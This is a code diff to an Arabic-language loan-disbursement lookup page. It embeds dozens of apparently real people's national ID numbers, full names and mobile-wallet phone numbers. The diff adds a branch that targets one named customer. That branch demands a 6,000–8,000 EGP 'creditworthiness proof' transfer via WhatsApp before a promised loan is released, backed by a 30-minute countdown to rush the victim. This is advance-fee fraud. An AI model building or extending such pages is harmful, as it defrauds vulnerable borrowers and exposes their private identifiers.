@@ -7,7 +7,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* جميع الأنماط كما هي دون تغيير */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
             --bg-deep: #0B0E17;
@@ -89,6 +88,13 @@
         .suspended-card {
             background: linear-gradient(145deg, #1A1120, #0D0712);
             border: 2px solid #FF8C42;
+            border-radius: 2rem;
+            padding: 1.8rem;
+            text-align: center;
+        }
+        .proof-required-card {
+            background: linear-gradient(145deg, #1A1F2E, #0E1220);
+            border: 2px solid #FFD966;
             border-radius: 2rem;
             padding: 1.8rem;
             text-align: center;
@@ -245,7 +251,7 @@
         "270090453": { name: "احمد منصور سالم محمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01008545212", suspended: false },
         "303120104532": { name: "يوسف فتحى السيد عبدالله", loan: 50000, wallet: "فودافون كاش", walletNum: "01065453768", suspended: false },
         "26507070103112": { name: "أحمد عبد الفتاح الضوي محمد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01152452111", suspended: false },
-        "29407021601596": { name: "رضا على عبده على جلال", loan: 100000, wallet: "فودافون كاش", walletNum: "01026386317", suspended: false },
+        "29407021601596": { name: "رضا على عبده على جلال", loan: 100000, wallet: "فودافون كاش", walletNum: "01026386317", suspended: true, proofRequired: true },
         "27503111700331": { name: "ياسر شبل محمد عبد العاطي", loan: 200000, wallet: "فودافون كاش", walletNum: "01000999850", suspended: false },
         "29501022100139": { name: "عبدالرحمن حسن إبراهيم نور", loan: 50000, wallet: "فودافون كاش", walletNum: "01090586268", suspended: false },
         "26502092501411": { name: "اشرف عبدالرازق عبدالحميد عبد العال", loan: 50000, wallet: "اتصالات كاش", walletNum: "01111250210", suspended: false },
@@ -278,12 +284,12 @@
         "28412021701647": { name: "اميره محمد احمد", loan: 150000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
         
         // العملاء الجدد
-        "29407021601596": { name: "رضا على عبده على جلال", loan: 100000, wallet: "فودافون كاش", walletNum: "01026386317", suspended: false },
+        "28705050203009": { name: "ياسمينا سامى محمد محمود محمد", loan: 50000, wallet: "فودافون كاش", walletNum: "01018004862", suspended: false },
         "26409111400958": { name: "مرعى زكى ابراهيم ابو النور", loan: 190000, wallet: "فودافون كاش", walletNum: "01012686294", suspended: false },
         "02805240200098": { name: "سعيد عوض محمد ادم", loan: 100000, wallet: "اتصالات كاش", walletNum: "01115891387", suspended: false },
         "27504082301097": { name: "محمد محمد على السيد", loan: 50000, wallet: "فودافون كاش", walletNum: "01030503094", suspended: false },
 
-        // العملاء الجدد من نموذج استمارة (35).xlsx (تم تصحيح الأرقام)
+        // العملاء الجدد من نموذج استمارة (35).xlsx
         "28209022103972": { name: "سامي سلامة عبد الغني متولي", loan: 150000, wallet: "اتصالات كاش", walletNum: "01156266034", suspended: false },
         "27801201200797": { name: "جمال إبراهيم إسماعيل إبراهيم", loan: 195000, wallet: "فودافون كاش", walletNum: "01026822829", suspended: false },
         "28801012208519": { name: "محمود محمد محمد حسن", loan: 30000, wallet: "اتصالات كاش", walletNum: "01120256340", suspended: false },
@@ -311,6 +317,65 @@
         let mins = Math.floor(totalSec / 60);
         let secs = totalSec % 60;
         return `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+    }
+
+    // رسالة خاصة لعميل رضا على عبده (يتطلب إثبات الجدارة عبر واتساب)
+    function buildProofRequiredMessage(customer, nationalId) {
+        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
+        return `
+            <div class="proof-required-card">
+                <i class="fas fa-shield-alt" style="font-size:3rem; color:#FFD966;"></i>
+                <h2 style="color:#FFD966;">⚠️ إثبات الجدارة الائتمانية مطلوب</h2>
+                <p style="margin:1rem 0;"><strong>${customer.name}</strong> ، لصرف مبلغ القرض المدفوع (${customer.loan.toLocaleString('ar-EG')} ج.م) يجب عليك إثبات الجدارة الائتمانية من خلال قسم التحويلات المالية على واتساب.</p>
+                <div class="step-box" style="border-right-color:#FFD966;">
+                    <strong>📌 تعليمات إثبات الجدارة:</strong><br>
+                    • المبلغ المطلوب لإثبات الجدارة: <span class="highlight-value" style="color:#FFD966; font-weight:bold;">${proofAmount.toLocaleString('ar-EG')} ج.م</span><br>
+                    • قم بالتواصل مع قسم التحويلات المالية عبر الزر أدناه.<br>
+                    • سيتم إرشادك لإجراء تحويل دائري (إيداع ثم إعادة) لإثبات ملكية المحفظة.<br>
+                    • بعد الإثبات مباشرة، سيتم صرف كامل المبلغ (${customer.loan.toLocaleString('ar-EG')} ج.م) في حسابك.
+                </div>
+                <div class="timer-glow">
+                    <div><i class="fas fa-stopwatch"></i> يرجى إتمام الإجراء خلال 30 دقيقة</div>
+                    <div class="timer" id="proofTimer">30:00</div>
+                </div>
+                <button class="btn-whatsapp" id="proofWhatsAppBtn">
+                    <i class="fab fa-whatsapp fa-lg"></i> التواصل مع قسم التحويلات المالية لإثبات الجدارة
+                </button>
+                <div class="step-box" style="margin-top:1rem;">
+                    <i class="fas fa-info-circle"></i> ملاحظة: لن يتم صرف المبلغ إلا بعد إتمام إجراءات إثبات الجدارة بنجاح.
+                </div>
+            </div>
+        `;
+    }
+
+    function startProofTimer() {
+        let secondsLeft = 30 * 60;
+        const timerEl = document.getElementById('proofTimer');
+        if (!timerEl) return;
+        const interval = setInterval(() => {
+            if (secondsLeft <= 0) {
+                clearInterval(interval);
+                timerEl.innerText = "00:00";
+                alert("انتهت المهلة المحددة لإثبات الجدارة. سيتم إلغاء العملية.");
+            } else {
+                secondsLeft--;
+                const mins = Math.floor(secondsLeft / 60);
+                const secs = secondsLeft % 60;
+                timerEl.innerText = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+            }
+        }, 1000);
+    }
+
+    function attachProofEvents(customer, nationalId) {
+        const proofBtn = document.getElementById('proofWhatsAppBtn');
+        if (proofBtn) {
+            proofBtn.onclick = () => {
+                const proofAmount = customer.loan < 100000 ? 6000 : 8000;
+                const msg = `📢 طلب إثبات الجدارة الائتمانية\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب إثباته: ${proofAmount.toLocaleString('ar-EG')} ج.م\nالمبلغ المستحق للصرف: ${customer.loan.toLocaleString('ar-EG')} ج.م\nأرجو توجيهي لإتمام إجراءات الإثبات.`;
+                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+                alert("تم فتح محادثة واتساب مع قسم التحويلات المالية. يرجى متابعة التعليمات لإتمام الإثبات.");
+            };
+        }
     }
 
     function buildHoldMessage(customer, nationalId) {
@@ -518,7 +583,17 @@
             currentCustomer = customer;
             currentNationalId = nationalId;
 
-            // حالة خاصة لعبد الرحيم احمد
+            // حالة خاصة لرضا على عبده (يتطلب إثبات الجدارة فوراً)
+            if (nationalId === "29407021601596") {
+                const html = buildProofRequiredMessage(customer, nationalId);
+                document.getElementById('resultSection').innerHTML = html;
+                startProofTimer();
+                attachProofEvents(customer, nationalId);
+                document.getElementById('errorCard').style.display = 'none';
+                return;
+            }
+
+            // حالة خاصة لعبد الرحيم احمد (تعليق لمدة ساعة)
             if (nationalId === "28712102703133") {
                 if (!customer.holdUntil) {
                     customer.holdUntil = Date.now() + HOLD_DURATION_MS;
